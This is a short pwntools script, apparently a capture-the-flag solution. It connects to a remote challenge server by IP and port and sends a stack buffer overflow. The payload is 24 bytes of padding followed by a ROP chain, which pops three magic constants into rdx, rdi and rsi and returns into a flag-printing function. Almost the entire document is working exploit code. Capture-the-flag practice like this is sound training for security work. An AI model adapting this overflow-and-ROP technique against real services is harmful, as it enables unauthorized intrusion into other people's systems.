from pwn import *

p = remote("146.19.212.156", 10003)
#p = process("./chall")
#gdb.attach(p, "")

payload = b"a" * 24 # 16 bytes input plus RBP(8 byte)
payload += p64(0x401295)  #: pop rdx; pop rdi; pop rsi; ret;
payload += p64(0xCAFEBABE) # for rdx
payload += p64(0xDEADBEEF) # for rdi
payload += p64(0xC0DEBEEF) # for rsi
payload += p64(0x4011DD) # address of function that give us the flag

p.sendline(payload)
p.interactive()

#ropper -f chall  user ==> rooper for ROP